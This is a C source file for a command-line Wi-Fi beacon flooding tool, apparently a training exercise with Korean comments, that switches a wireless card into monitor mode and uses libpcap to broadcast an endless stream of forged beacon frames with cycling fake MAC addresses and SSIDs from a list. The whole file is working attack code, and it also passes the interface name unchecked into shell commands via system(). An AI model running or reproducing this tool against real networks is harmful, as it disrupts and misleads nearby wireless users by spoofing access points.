#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "beacon.c"

#define NULL 0x00

void monitor(char *dev){    //랜카드 모니터 모드 설정
    char command[50];
    if(strlen(dev)>20){
        printf("interface name length less than 20 characters");
        exit(0);
    }
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}


void usage(){
    printf("syntax: beaconFlooding <interface> <ssidFile>\n");
    printf("sample: beaconFlooding wlan0 ssidList.txt\n");
}


int main(int argc, char* argv[]) {
    if (argc != 3) {
        usage();
        return 0;
    }

    char * dev = argv[1];
    char * ssidFile = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    monitor(dev);

    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    FILE* pFile = fopen(ssidFile, "rb");
    if (pFile == NULL){
        printf("File not Found!\n");
        exit(0);
    }

    //가짜 비콘 프레임 생성/초기화
    struct fake_beacon beacon;
    beacon.radiotap.version = 0x00;
    beacon.radiotap.pad = 0x00;
    beacon.radiotap.len = 0x0018;
    beacon.radiotap.present = 0xa000402e;
    memset(beacon.radiotap.dummy,0x00,sizeof(uint8_t)*16);
    beacon.becon.frame_control = 0x0080;
    beacon.becon.duration_id = 0x0000;
    memset(beacon.becon.dhost,0xff,sizeof(uint8_t)*6);
    beacon.becon.squence_control = 0x0000;
    memset(beacon.fixed.timestamp,0x00,sizeof(uint8_t)*8);
    beacon.fixed.beacon_interval = 0x0000;
    beacon.fixed.capacity_info = 0x0000;
    beacon.tag_ssid.element_id = 0x00;
    beacon.tag_ssid.len = 32;
    /* //channel info
    beacon.tag_sup.number = 0x01;
    beacon.tag_sup.len = 0x03;
    memset(beacon.tag_sup.rates,0x00,sizeof(char)*3);
    beacon.tag_ds.number = 0x03;
    beacon.tag_ds.len = 0x01;
    beacon.tag_ds.channel = 0x06;
    */

    while (1) {
        //change MAC
        if(beacon.becon.shost[5] == 0xff){
            beacon.becon.shost[5] = 0x00;
            beacon.becon.shost[4]++;
            if(beacon.becon.shost[4]==0xff){
                beacon.becon.shost[4] = 0x00;
                beacon.becon.shost[3]++;
                if(beacon.becon.shost[3]==0xff){
                    beacon.becon.shost[3] = 0x00;
                    beacon.becon.shost[2]++;
                    if(beacon.becon.shost[2]==0xff){
                        beacon.becon.shost[2] = 0x00;
                        beacon.becon.shost[1]++;
                        if(beacon.becon.shost[1]==0xff){
                            beacon.becon.shost[1] = 0x00;
                        }
                    }
                }
            }
        }
        beacon.becon.shost[5]++;
        memcpy(beacon.becon.bssid, beacon.becon.shost, 6);

        //ssid name list
        char strTemp[32];
        memset(strTemp,0x00,32);
        if(!feof(pFile)) fgets(strTemp, sizeof(strTemp),pFile);
        else fseek(pFile,0,SEEK_SET);
        if (strTemp[0]==0x00) continue; //ssid가 비어있으면 continue
        strTemp[strlen(strTemp)-1] = 0x00;
        memcpy(beacon.tag_ssid.ssid, strTemp, 32);

        if (pcap_sendpacket(pcap, (unsigned char*)&beacon, sizeof(beacon)) != 0){
            printf("Fail sendpacket\n");
            exit (-1);
        }

        printf(" [BSSID]: %02x:%02x:%02x:%02x:%02x:%02x | [SSID]: %s | send packet!\n",beacon.becon.bssid[0],beacon.becon.bssid[1],beacon.becon.bssid[2]
                                                                                      ,beacon.becon.bssid[3],beacon.becon.bssid[4],beacon.becon.bssid[5]
                                                                                      ,beacon.tag_ssid.ssid);
        usleep(100);
    }
    fclose(pFile);
    pcap_close(pcap);
}
